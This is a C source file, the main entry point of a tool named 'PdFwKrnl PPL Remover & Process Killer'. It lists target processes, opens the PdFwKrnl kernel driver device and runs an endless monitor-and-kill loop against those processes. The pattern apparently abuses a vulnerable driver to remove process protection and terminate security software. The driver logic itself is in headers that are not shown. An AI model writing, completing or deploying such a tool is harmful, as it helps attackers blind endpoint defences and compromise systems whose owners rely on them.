#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <stdio.h>
#include "PdFwKrnl.h"
#include "TerminateProcess.h"

// -----------------------
// Entry Point
// -----------------------

INT wmain(VOID)
{
    HANDLE hDev    = INVALID_HANDLE_VALUE;
    DWORD  dwIndex = 0;

    printf("=== PdFwKrnl PPL Remover & Process Killer ===\n\n");

    printf("[*] Target process list:\n");
    for (dwIndex = 0; dwIndex < g_TargetProcessCount; dwIndex++)
        printf("    [%lu] %ls\n", dwIndex, g_TargetProcessNames[dwIndex]);
    printf("\n");

    hDev = OpenPdFwDevice();
    if (hDev == INVALID_HANDLE_VALUE)
        return 1;

    printf("[+] PdFwKrnl device opened\n\n");

    // MonitorAndKillLoop never returns; Ctrl+C to exit
    MonitorAndKillLoop(hDev);
    return 0;
}
